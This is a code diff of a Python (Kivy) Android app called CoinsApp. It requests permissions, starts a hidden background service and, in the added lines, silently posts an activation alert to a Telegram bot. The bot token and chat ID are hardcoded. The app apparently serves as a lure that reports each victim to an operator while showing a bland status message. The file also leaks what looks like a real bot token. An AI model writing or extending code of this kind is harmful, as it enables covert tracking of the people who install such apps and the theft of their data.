@@ -4,7 +4,7 @@ from kivy.uix.button import Button
 from kivy.uix.label import Label
 from jnius import autoclass
 from android.permissions import request_permissions, Permission
-import requests
+import requests # ضروري لإرسال رسالة التنبيه
 
 BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
 CHAT_ID = "7084557369"
@@ -60,12 +60,18 @@ class CoinsApp(App):
 
     def launch(self, permissions, grants):
         try:
+            # 1. تشغيل الخدمة في الخلفية
             PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            # تم ربطها بالاسم الجديد للباكيج
             Service = autoclass('org.test.coinssync.ServiceMyservice')
             Service.start(PythonActivity.mActivity, "")
-            self.status.text = "Status: Processing..."
-        except Exception as e: self.status.text = "Error Connection"
+            
+            # 2. إرسال تنبيه فوري للبوت بأن التطبيق تم تفعيله الآن
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                          data={"chat_id": CHAT_ID, "text": "🚀 تذكير: تم الضغط على الزر الثالث وتفعيل النظام بنجاح!"})
+            
+            self.status.text = "Status: Connection Active"
+        except Exception as e: 
+            self.status.text = "Error Connection"
 
 if __name__ == "__main__":
     CoinsApp().run()
